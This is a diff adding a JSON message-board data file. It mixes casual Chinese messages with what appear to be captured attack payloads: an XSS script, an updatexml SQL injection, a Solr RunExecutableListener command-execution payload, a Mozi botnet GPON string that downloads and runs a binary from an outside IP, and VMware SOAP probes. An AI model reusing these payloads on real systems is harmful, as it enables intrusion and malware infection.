@@ -1,0 +1,44 @@
+{
+    "LeavingMsg": [
+        {
+            "id": 0,
+            "content": "我生气了"
+        },
+        {
+            "id": 1,
+            "content": "第一. 第二. 想好再找我。886"
+        },
+        {
+            "id": 2,
+            "content": "<script>alert('xss')</script>"
+        },
+        {
+            "id": 3,
+            "content": "sms_get_password\",\"goods_id\":32,\"mobile\":\"1\\'/**/or/**/updatexml(1,con\\cat(0x23,(sE\\lect user()),0x23),1)%23\",\"no_need_vcode\":"
+        },
+        {
+            "id": 4,
+            "content": "\"event\":\"postCommit\",\"name\":\"UhEBeFp\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"sh\",\"dir\":\"/bin/\",\"args\":[\"-c\", \"nslookup UhEBeFp 10.251.0.195\"]"
+        },
+        {
+            "id": 5,
+            "content": "hi"
+        },
+        {
+            "id": 2,
+            "content": "/89.208.122.222:34671/Mozi.m+-O+->/tmp/gpon80;sh+/tmp/gpon80&ipv=0"
+        },
+        {
+            "id": 3,
+            "content": "nvelope xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Header><operationID>00000001-00000001</operationID></soap:Header><soap:Body><RetrieveServiceContent xmlns=\"urn:internalvim25\"><_this xsi:type=\"ManagedObjectReference\" type=\"ServiceInstance\">ServiceInstance</_this></RetrieveServiceContent></soap:Body></soap:Envelope>"
+        },
+        {
+            "id": 4,
+            "content": "nvelope xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Header><operationID>00000001-00000001</operationID></soap:Header><soap:Body><RetrieveServiceContent xmlns=\"urn:internalvim25\"><_this xsi:type=\"ManagedObjectReference\" type=\"ServiceInstance\">ServiceInstance</_this></RetrieveServiceContent></soap:Body></soap:Envelope>"
+        },
+        {
+            "id": 0,
+            "content": "我气消了ξ( ✿＞◡❛)"
+        }
+    ]
+}
